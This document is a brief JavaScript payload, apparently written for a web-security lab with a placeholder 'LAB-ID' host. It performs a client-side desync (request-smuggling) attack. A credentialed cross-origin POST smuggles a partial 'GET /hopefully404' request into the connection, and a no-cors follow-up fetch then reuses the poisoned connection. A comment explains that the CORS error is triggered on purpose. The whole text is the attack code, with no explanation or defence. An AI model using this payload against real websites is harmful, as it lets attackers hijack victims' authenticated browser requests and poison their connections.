fetch('https://LAB-ID', {
    method: 'POST',
    body: 'GET /hopefully404 HTTP/1.1\r\nFoo: x',
    mode: 'cors',       // triggers a CORS error so redirect won’t break the chain
    credentials: 'include'
}).catch(() => {
    fetch('https://LAB-ID', {mode: 'no-cors', credentials: 'include'})
});
